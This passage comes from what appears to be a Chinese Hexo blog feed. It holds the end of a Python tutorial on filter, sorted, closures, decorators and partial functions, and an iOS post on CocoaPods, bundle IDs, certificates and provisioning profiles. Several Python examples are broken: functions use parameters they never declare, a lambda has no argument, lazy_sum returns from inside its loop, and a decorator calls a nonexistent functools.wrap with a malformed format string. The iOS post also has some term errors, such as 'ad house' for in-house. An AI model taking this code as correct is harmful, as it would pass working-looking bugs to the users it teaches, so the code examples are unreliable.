class="line"></div><div class="line">print(str2float(<span class="string">'123.456'</span>))</div></pre></td></tr></table></figure>
<h2 id="filter-sorted"><a href="#filter-sorted" class="headerlink" title="filter/sorted"></a>filter/sorted</h2><p>python内建的<code>filter()</code>函数用于过滤序列。和<code>map()</code>不同的是，<code>filter()</code>把传入的函数依次作用于每一个元素，然后跟据返回的值是True还是False决定保留还是丢弃该元素。下面举几个例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_ord</span><span class="params">()</span>:</span></div><div class="line">  <span class="keyword">return</span> n %<span class="number">2</span> ==<span class="number">1</span></div><div class="line">list(filter(is_ord, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">15</span>]))</div><div class="line"><span class="comment"># 结果: [1, 5, 9, 15]</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_empty</span><span class="params">(n)</span>:</span></div><div class="line">  <span class="keyword">return</span> s <span class="keyword">and</span> s.strip()</div><div class="line">list(filter(not_empty, [<span class="string">'A'</span>, <span class="string">''</span>, <span class="string">'B'</span>, <span class="keyword">None</span>, <span class="string">'C'</span>, <span class="string">'  '</span>]))</div><div class="line"><span class="comment"># 结果: ['A', 'B', 'C']</span></div></pre></td></tr></table></figure>
<p>我们可见<code>filter()</code>旨在做筛选，和<code>map()</code>一样，它返回的也是一个<code>Iterator</code>，也就是一个惰性序列，我们可以利用filter实现一个计算素数的方法—埃氏筛法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#首先构造一个从3开始的奇数序列</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_odd_iter</span><span class="params">()</span>:</span></div><div class="line">  	n = <span class="number">1</span></div><div class="line">  	<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">  		n = n + <span class="number">2</span></div><div class="line">        <span class="keyword">yield</span> n</div><div class="line"><span class="comment">#定义一个筛选函数</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_not_divisible</span><span class="params">(n)</span>:</span></div><div class="line">  	<span class="keyword">return</span> <span class="keyword">lambda</span> x: x % n &gt; <span class="number">0</span></div><div class="line"><span class="comment">#定义一个生成器，不断返回下一个素数</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">primes</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">yield</span> <span class="number">2</span></div><div class="line">    it = _odd_iter() <span class="comment"># 初始序列</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        n = next(it) <span class="comment"># 返回序列的第一个数</span></div><div class="line">        <span class="keyword">yield</span> n</div><div class="line">        it = filter(_not_divisible(n), it) <span class="comment"># 构造新序列</span></div><div class="line"><span class="comment">#设置调用条件，打印1000以内的素数:</span></div><div class="line"><span class="keyword">for</span> n <span class="keyword">in</span> primes():</div><div class="line">    <span class="keyword">if</span> n &lt; <span class="number">1000</span>:</div><div class="line">        print(n)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">break</span></div></pre></td></tr></table></figure>
<p>我们都知道在C语言中有一个练习是判断一个字符串是不是回文串，那么使用python的<code>filter()</code>去实现的话就很简单了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">L = [<span class="number">12321</span>, <span class="number">565</span>, <span class="number">2222</span>,<span class="number">34343</span>]</div><div class="line">print(filter(<span class="keyword">lambda</span>: x == int(str(x)[::<span class="number">-1</span>], L)))</div></pre></td></tr></table></figure>
<p>同时排序也是程序中会经常用到的算法，但是有时候我们需要根据我们的需求进行不同衡量标准的排序，这个时候我们就可以使用python中名为<code>sorted()</code>的高阶函数，这个函数中有一参数是key，我们可以根据需要传入排序衡量的标准，key指定的函数将作用于list的每一个元素上，并根据key函数返回的结果进行排序。对比原始的list和经过<code>key=abs</code>处理过的list，也许你觉得这样说有点抽象，那么我们就来举个例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#正常数字排序是从小到大</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sorted([<span class="number">36</span>, <span class="number">5</span>, <span class="number">-12</span>, <span class="number">9</span>, <span class="number">-21</span>])</div><div class="line">[<span class="number">-21</span>, <span class="number">-12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">36</span>]</div><div class="line"><span class="comment">#但是我们可以选择按照绝对值去排序</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sorted([<span class="number">36</span>, <span class="number">5</span>, <span class="number">-12</span>, <span class="number">9</span>, <span class="number">-21</span>], key=abs)</div><div class="line"><span class="comment">#如果需要反向排序，只需要添加第三个参数</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sorted([<span class="number">36</span>, <span class="number">5</span>, <span class="number">-12</span>, <span class="number">9</span>, <span class="number">-21</span>], key=abs, reverse=<span class="keyword">True</span>)</div></pre></td></tr></table></figure>
<p>也许你会说这似乎也没什么了不起的，还是在排序罢了，那么接下来就介绍一下如果给我们平时无法排序的类型去指定标准，我们都知道字典是无序的，也没有什么标准，那么我们就来以字典的value作为排序的标准；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">print(sorted(dict1, key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>]))</div><div class="line"><span class="comment">#当然我们也可以选择key做为排序的标准</span></div><div class="line">print(sorted(dict2, key=<span class="keyword">lambda</span> x:int(x[<span class="number">0</span>])))</div></pre></td></tr></table></figure>
<p>由此可见高阶函数的抽象能力还是很强大的。</p>
<h2 id="返回函数"><a href="#返回函数" class="headerlink" title="返回函数"></a>返回函数</h2><p>高阶函数出了可以接受对象作为参数之外还可以将函数作为结果值返回，当我们并不需要一个函数立刻执行的时候，就可以使用返回函数，比如我们在做累加的时候，不需要立刻去算出加法的值：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">lazy_sum</span><span class="params">(*argv)</span>:</span></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">sum</span><span class="params">()</span>:</span></div><div class="line">    ax = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> args:</div><div class="line">      ax += n</div><div class="line">      <span class="keyword">return</span> ax</div><div class="line">  <span class="keyword">return</span> sum</div></pre></td></tr></table></figure>
<p>那么在这个函数执行的时候，返回的就是一个函数对象，而不是执行了求和之后的结果，只有调用了<code>f()</code>之后才是真正计算求和的结果。这里还要提到一个概念就是闭包，学过javascript的同学可能会知道闭包的概念。所谓闭包，就是将<strong>组成函数的语句</strong>和这些语句的<strong>执行环境</strong>打包在一起时，得到的对象，也就是像上面的程序中<code>sum()</code>函数调用了外部函数的变量并处理了之后最后将这些整体作为一个函数对象返回值，这个就叫做闭包。</p>
<p>有一点需要注意的就是一个函数返回了另一个函数之后，内部的局部变量还在背新函数引用，所以闭包实现其实并不简单</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">()</span>:</span></div><div class="line">  fs = []</div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>):</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></div><div class="line">      <span class="keyword">return</span> i*i</div><div class="line">    fs.append(f)</div><div class="line">  <span class="keyword">return</span> fs</div><div class="line"></div><div class="line">f1, f2, f3 = count()</div></pre></td></tr></table></figure>
<p>正常而言我们可能会觉得调用上面的三个函数之后打印的结果应该是1, 4, 9，但是实际打印的结果全是9，原因就是因为返回的函数引用了变量<code>i</code>，等到i最后返回的时候它的值已经是3了，所以最终的执行结果全都是9。所以在闭包的时候一定要记住的一点就是返回函数不要引用任何的循环变量，或者后续会发生变化的变量。</p>
<p>如果一定要使用循环变量的话，方法就是再创建一个函数，用该函数的参数绑定循环变量当前的值，无论该循环变量后续如何更改，已绑定到函数参数的值不变：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">()</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(j)</span>:</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">()</span>:</span></div><div class="line">            <span class="keyword">return</span> j*j</div><div class="line">        <span class="keyword">return</span> g</div><div class="line">    fs = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>):</div><div class="line">        fs.append(f(i)) <span class="comment"># f(i)立刻被执行，因此i的当前值被传入f()</span></div><div class="line">    <span class="keyword">return</span> fs</div></pre></td></tr></table></figure>
<h2 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h2><p>在之前的demo中我们频繁的用到了lambda表达式，这个在python中被称作匿名函数，但是python对于匿名函数的支持有限，只有一些简单的情况下可以使用匿名函数，这个限制就表现在匿名函数只能有一个表达式，不用写<code>return</code>，返回值就是该表达式的结果。然后就说一下装饰器。</p>
<p>那么什么叫做装饰器呢？在面向对象编程中我们有一个概念叫做装饰器模式，如果有了解过再去理解python中的装饰器就会比较容易了，OOP的装饰模式需要通过继承和组合来实现，python除了支持oop的装饰器还可以从语法层次上去支持。首先我们要知道python中一切皆为对象，那么函数也是一个对象，而且函数对象可以被赋值给变量，所以通过变量也能调用该函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">now</span>:</span></div><div class="line"><span class="meta">... </span> print(<span class="string">'hello'</span>)</div><div class="line">...</div><div class="line">&gt;&gt;&gt;f = now</div><div class="line">&gt;&gt;&gt;f()</div><div class="line">hello</div></pre></td></tr></table></figure>
<p>函数对象有一个<code>__name__</code>属性，可以获取函数的名字，如果我们现在要增加一下这个函数的功能，但是又不想重新修改函数的定义，这种在代码的运行期间动态增加功能的方式就称作装饰器。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(func)</span>:</span></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*argv, **kw)</span>:</span></div><div class="line">    print(<span class="string">'call %s()'</span> % func.__name__)</div><div class="line">    <span class="keyword">return</span> func(*argv, **kw)</div><div class="line">  <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="comment">#@符号是装饰器的语法糖，在定义函数的时候使用，避免再一次赋值操作 </span></div><div class="line"><span class="meta">@log</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">now</span><span class="params">()</span>:</span></div><div class="line">  print(<span class="string">'hello'</span>)</div></pre></td></tr></table></figure>
<p>那么这样的话我们就达到了在函数中添加打印日志的功能了，可能到这里还是有很多人并不知道装饰器到底有什么用，这里举个简单的例子，如果有很多函数都有打印日志的需求，在每个函数中都写一个，这样就会造成大量雷同的代码，装饰器是解决这类问题的绝佳设计，而且我们可以看到函数中可以传入任意的参数。</p>
<p>上面那个只是没有带参数的装饰器，其实我们可以理解为一个含有参数的闭包</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(text)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(func)</span>:</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kw)</span>:</span></div><div class="line">            print(<span class="string">'%s %s():'</span> % (text, func.__name__))</div><div class="line">            <span class="keyword">return</span> func(*args, **kw)</div><div class="line">        <span class="keyword">return</span> wrapper</div><div class="line">    <span class="keyword">return</span> decorator</div><div class="line"><span class="meta">@log('execute')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">now</span><span class="params">()</span>:</span></div><div class="line">  print(<span class="string">'hello'</span>)</div></pre></td></tr></table></figure>
<p>这样我们就可以给装饰器也传入参数，但是这样还是差一步，因为我们说过函数也是一个对象，因为返回的那个<code>wrapper()</code>函数名字就是<code>wrapper</code>，所以还需要把原始函数的属性复制过去，不然某些依赖函数签名执行的代码就会出错。但是我们不需要手动进行<code>wrapper.__name__ = func.__name__</code>这样的代码，python的内置函数就可以干这个事情了，所以一个完整的<code>decorator</code>应该是这个样子的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> functools</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">()</span>:</span></div><div class="line"><span class="meta">  @functools.wrap(func)</span></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*argv, **kw)</span>:</span></div><div class="line">    print(<span class="string">'%s s():'</span> % (text, func.__name__))</div><div class="line">    <span class="keyword">return</span> func(*argv, **kw)</div><div class="line">  <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#如果是带参数的就是这样</span></div><div class="line"><span class="keyword">import</span> functools</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(text)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(func)</span>:</span></div><div class="line"><span class="meta">        @functools.wraps(func)</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kw)</span>:</span></div><div class="line">            print(<span class="string">'%s %s():'</span> % (text, func.__name__))</div><div class="line">            <span class="keyword">return</span> func(*args, **kw)</div><div class="line">        <span class="keyword">return</span> wrapper</div><div class="line">    <span class="keyword">return</span> decorator</div></pre></td></tr></table></figure>
<p>虽然装饰器的语法有些麻烦，但用起来却十分的灵活方便，如果有之后学习<code>flask</code>框架的，就会经常用到这种模式了。</p>
<h2 id="偏函数"><a href="#偏函数" class="headerlink" title="偏函数"></a>偏函数</h2><p>当我们觉得函数的参数太多的时候，是否觉得过于繁琐，但是有些参数有些情况需要，有些情况不需要，所以使用缺省参数也是不太合理的，于是我们从python的<code>functools</code>模块中找到了一个非常好用的功能，那就是偏函数，我们可以通过设定参数的默认值，可以降低函数调用的难度：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#int()函数默认按十进制转换</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>int(<span class="string">'123456'</span>)</div><div class="line"><span class="number">123456</span></div></pre></td></tr></table></figure>
<p>但<code>int()函数</code>还提供了额外的参数，可以做到N进制的转换，那么如果我们有个要求是做二进制的转换的时候，每次都多加一个参数显然是没有必要的，所以就可以使用偏函数去固定这个参数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> functools</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>int2 = functools.partial(int, base=<span class="number">2</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>int2(<span class="string">'1000000'</span>)</div><div class="line"><span class="number">64</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>int2(<span class="string">'1010101'</span>)</div><div class="line"><span class="number">85</span></div></pre></td></tr></table></figure>
<p>实际创建偏函数的时候，我们可以接受函数对象，<code>*argv</code>,<code>**kw</code>这三个参数，当函数的参数个数太多，需要简化时，使用<code>functools.partial</code>可以创建一个新的函数，这个新函数可以固定住原函数的部分参数，从而在调用时更简单。</p>
]]></content>
      
        <categories>
            
            <category> 函数式编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS第三方和权限问题]]></title>
      <url>/2017/11/05/iOS%E7%AC%AC%E4%B8%89%E6%96%B9%E5%92%8C%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<p>开始开发稍微大型一点的项目之后用到的第三方库就会变多，所以就需要用到了iOS的第三方库管理</p>
<a id="more"></a>
<h1 id="iOS第三方和权限问题"><a href="#iOS第三方和权限问题" class="headerlink" title="iOS第三方和权限问题"></a>iOS第三方和权限问题</h1><p>很多时候我们作为菜鸟想从github上当下大神的代码实践的时候。兴高采烈的准备编译的时候，就会爆出一堆红色的错误，说我们没有相应的库，或者xxx文件找不到的问题，就算安装了之后，再次编译也会爆出类似：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-04%20%E4%B8%8A%E5%8D%888.32.40.png" alt="屏幕快照 2017-11-04 上午8.32.40.png" title="" class="">
                <p>屏幕快照 2017-11-04 上午8.32.40.png</p>
            </figure>
<p>这样的错误，这个时候我们就需要对Apple的一些机制做一些了解，还有一个很重要的东西就是Cocoapods。</p>
<h2 id="Cocoapods"><a href="#Cocoapods" class="headerlink" title="Cocoapods"></a>Cocoapods</h2><p>CocoaPods是OS X和iOS下的一个第三类库管理工具，通过CocoaPods工具我们可以为项目添加被称为<code>Pods</code>的依赖库（这些类库必须是CocoaPods本身所支持的），并且可以轻松管理其版本。比如说我们会经常使用的SDWebImage之类的框架，都可以使用它来进行管理。</p>
<p>那么这个工具究竟该如何的去使用呢？下面就来简单的介绍一下，安装的过程就不说了。在Mac上非常的简单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#首先来搜索一下第三方的库吧</div><div class="line">pod search AFNetworking</div></pre></td></tr></table></figure>
<p>如果这个时候出现：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-04%20%E4%B8%8A%E5%8D%888.39.21.png" alt="屏幕快照 2017-11-04 上午8.39.21.png" title="" class="">
                <p>屏幕快照 2017-11-04 上午8.39.21.png</p>
            </figure>
<p>这个是因为之前<code>pod search</code>的时候生成了缓存文件search_index.json，这个时候执行命令来删除该文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm ~/Library/Caches/CocoaPods/search_index.json</div></pre></td></tr></table></figure>
<p>那么我们这个时候在搜索一次吧，出现下面这种情况就是正常的了，我们只是尝试一，退出就好：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-04%20%E4%B8%8A%E5%8D%888.41.55.png" alt="屏幕快照 2017-11-04 上午8.41.55.png" title="" class="">
                <p>屏幕快照 2017-11-04 上午8.41.55.png</p>
            </figure>
<p>如果我们需要在工程中导入第三方的库应该怎么做呢？首先创建一个Podfile吧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /Users/xxx/xxx/TestProject</div><div class="line">touch Podfile</div></pre></td></tr></table></figure>
<p>然后我们就可以打开我们的vim去编辑这个Podfile文件了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim Podfile</div></pre></td></tr></table></figure>
<p>然后输入我们需要导入的第三方库以及他们的版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">platform :ios, &apos;8.0&apos;</div><div class="line">use_frameworks!</div><div class="line">target &apos;TestProject&apos; do</div><div class="line">pod &apos;AFNetworking&apos;, &apos;~&gt; 3.1.0&apos;</div><div class="line">end</div></pre></td></tr></table></figure>
<blockquote>
<p>解释一下</p>
<p>platform :ios, ‘8.0’代表当前AFNetworking支持的iOS最低版本是iOS 8.0,</p>
<p>‘TestProject’就是你自己的工程名字</p>
<p>pod ‘AFNetworking’, ‘~&gt; 3.1.0’代表要下载的AFNetworking版本是3.1.0及以上版本，还可以去掉后面的’~&gt; 3.1.0’，直接写pod ‘AFNetworking’，这样代表下载的AFNetworking是最新版。</p>
</blockquote>
<p>现在我们只是完成了配置，还没有去真正的下载这些第三方的库，还要执行一次：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pod install</div></pre></td></tr></table></figure>
<p> 同时我们还可以通过<code>pod update</code>命令去更新我们的第三方框架。</p>
<h2 id="xcworkspace"><a href="#xcworkspace" class="headerlink" title="xcworkspace"></a>xcworkspace</h2><ol>
<li>简单介绍</li>
</ol>
<p>在Cocoapods安装后，项目文件里都会多一个后缀为.xcworkspace的文件，打开这个文件就相当于打开最初常见的项目。这个文件也就是用来管理项目的，它包含你创建的项目和Cocoapods项目。</p>
<p>.xcworkspace文件可以是我们在<code>pod install</code>之后生成的新文件也可以是我们手动去创建的，这个文件在我们的项目根目录下，接下来就是使用.xcworkspace去打开我们的文件而不是.xcodeproj了，从中可以看到类似下面的目录结构：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-04%20%E4%B8%8B%E5%8D%8811.18.07.png" alt="屏幕快照 2017-11-04 下午11.18.07.png" title="" class="">
                <p>屏幕快照 2017-11-04 下午11.18.07.png</p>
            </figure>
<p>其中红色部分就是我们通过pods下载的类库了，以AFNetworking类库为例，可以通过<code>#import AFNetworking.h</code>引入下载后的类库。<br>另外CocoaPods支持搜索命令，例如在终端中输入命令<code>pod search AFNetworking</code>，便可以获得AFNetworking类库的各版本信息，这一点和命令<code>npm search</code>功能相同。</p>
<ol>
<li>使用总结</li>
</ol>
<p>Podfile中的列表，大家可以看到下载了很多类库，但如果下载后的类库都添加到svn版本库中，这无疑会使我们的项目过于庞大，并且不利于其他人checkout和管理，但我们可以不将下载后的类库添加到<code>git</code>或者<code>svn</code>版本库中，只需添加PodFile到版本库中，这样需要checkout项目的同事就可以根据PodFile了解项目中使用的类库并通过pod命令下载依赖的类库。</p>
<p>同样这样是为什么我们从github上下载一个文件的时候需要首先<code>pod install</code>一下，就是去下载这些依赖类库，正如大家所知，github的服务器在国外，如果把一个完整的项目都上传上去，不仅我们的时间久，想要clone的天朝同学更是想要自刎了，又解决了一个问题啦～</p>
<h2 id="账号管理和配置ID"><a href="#账号管理和配置ID" class="headerlink" title="账号管理和配置ID"></a>账号管理和配置ID</h2><h3 id="账号管理"><a href="#账号管理" class="headerlink" title="账号管理"></a>账号管理</h3><p><code>Xcode-&gt;preferences-&gt;Accounts</code>管理项目用到的所有账户,包括用于管理代码签署的资产的Apple ID。通过添加一个Apple ID账户,选择加入苹果开发者计划（Apple Developer Program）,并将项目分配给一个团队,你提供Xcode的凭证管理证书,标识符和概要文件。如果你没有一个苹果ID,您可以创建一个免费的。然而,如果你不加入苹果开发者计划，您的应用程序可以使用的功能是有限的</p>
<p>账号的添加删除操作都是在Xcode的Preference中进行的，这一部分的操作太简单就不说了。</p>
<h3 id="bundle-ID配置"><a href="#bundle-ID配置" class="headerlink" title="bundle ID配置"></a>bundle ID配置</h3><p>接下来就是关于配置Xcode项目中的Bundle ID的问题了，bundle ID可以精确的识别单个app，用于在开发过程中提供设备和在操作系统分发app给客户。</p>
<p>bundle ID必须是一个统一类型标识符(UTI)的字符串，只包含字母数字字符(a -z、a - z、0 - 9)、连字符(-)和点(.)。在开发过程中，我们会有很多地方都会用到它去识别app:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-05%20%E4%B8%8A%E5%8D%8812.48.33.png" alt="屏幕快照 2017-11-05 上午12.48.33.png" title="" class="">
                <p>屏幕快照 2017-11-05 上午12.48.33.png</p>
            </figure>
<p>具体来说，bundleID的位置和使用如下：</p>
<ol>
<li>在Xcode项目,包ID存储在信息属性列表文件(Info.plist)。 这个文件是以后当你构建项目时复制到应用程序的包中。·</li>
<li>在iTunes Connect,您输入bundle ID来识别你的应用。在你第一个构建版本上传到iTunes Connect之后,你不能改变你的bundle ID或删除相关的明确App ID。·</li>
<li>在Member Center，您创建一个与应用程序的bundle ID相匹配的AppID。如果AppID是一个显式的App ID,它完全匹配bundle ID。然而,与域名不同, bundle ID是区分大小写的。 如果应用程序ID是小写,你的包ID必须是小写的。·在iCloud,您所指定的容器id在Xcode项目是基于一个或多个应用程序的bundle ID</li>
</ol>
<h3 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h3><p>ios certificates就是证书。它的作用就是证明你的mac具有开发或发布某个开发者账号下应用的权限。而且证书还分成两种，一种是开发证书，也叫Development certificate; 另一种是发布证书或叫生产证书，英文名叫Production  certificate。</p>
<ul>
<li><p>development certificate</p>
<p>开发证书是证明你的mac具有开发和真机调试你的程序的东西。但是每个证书关联着一个开发者账号，也就是说，你只能使用这个证书开发这个账号底下的应用，它是通过bundle id来知道该应用是不是属于自己的账号。所以，每次为一个开发者帐号开发应用，就得需要这个账号创建的开发证书。</p>
</li>
<li><p>Production certificate</p>
<p>生产证书是证明你的mac是否具有发布应用的权限。在archive到appstore的时候，必须有生产证书，否则时上传不成功的。</p>
</li>
<li><p>根证书</p>
<p>无论是开发证书还是生产证书，都必须从根证书上派生。根证书就是根mac产生的证书，menber center上保存的那个证书就是根证书，它只能安装在创建它的那台mac上，其他的开发mac必须从那台根mac上导出证书使用。也就是所有的子证书都只能从根证书派生而来。</p>
</li>
</ul>
<h3 id="描述文件"><a href="#描述文件" class="headerlink" title="描述文件"></a>描述文件</h3><p>iOS Provisioning Profiles也叫描述文件，它用来标识某个设备是否具有安装某个应用的权限。描述文件分为开发描述文件和发布描述文件。其中发布描述文件又分为临时发布描述文件和正式发布描述文件。</p>
<ol>
<li><p>开发描述文件(develop provisioning profile)<br>开发描述文件，创建它需要<code>bundle ID + 开发证书 ＋ 测试设备(在devices中添加)</code>; 编译的时候必须三者对应，否则编译器会报错。</p>
</li>
<li><p>临时发布描述文件(distribution ad hoc)<br>临时发布描述文件是用来在有限设备上发布的。创建它需要<code>bundle ID ＋发布证书＋发布设备</code>，编译时也必须三者对应。</p>
</li>
<li><p>正式发布描述文件(distribution appstore/distribution ad house)</p>
<p>个人账号和企业账号创建的正式发布描述文件是不同的。因为个人账号是在appstrore上发布，所以创建的是distribution appstore描述文件，而企业账号只能内部发布，所以创建的叫distribution ad house描述文件。但是它们创建所需要的东西都是一样的：bundle ID + 发布证书。 因为他们是在不确定的设备上安装的，所以不需要选择设备。</p>
</li>
</ol>
